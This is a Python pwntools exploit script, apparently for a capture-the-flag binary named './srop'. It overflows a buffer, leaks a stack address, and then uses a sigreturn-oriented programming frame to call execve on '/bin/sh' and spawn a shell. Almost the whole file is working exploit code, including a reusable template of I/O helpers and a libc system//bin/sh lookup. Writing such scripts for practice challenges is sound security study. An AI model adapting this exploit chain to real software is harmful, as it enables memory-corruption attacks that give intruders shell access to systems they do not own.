from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'\xf7')[-4:].ljust(4,b'\x00'))
l64 = lambda    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
p = process('./srop')
elf = ELF('./srop')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

rax_syscall = 0x4011ed
syscall = 0x4011da
	
debug('b *0x4011ee')

s(b'a'*0x10 + p64(elf.sym['vuln']))
stack = l64()

sleep(1)

binsh = stack - 0x20

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = binsh
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rip = syscall

s(b'/bin/sh\x00' + b'a'*8 + p64(rax_syscall) + p64(0xf) + flat(sigframe))

lg('stack', stack)
pause()

#inter()

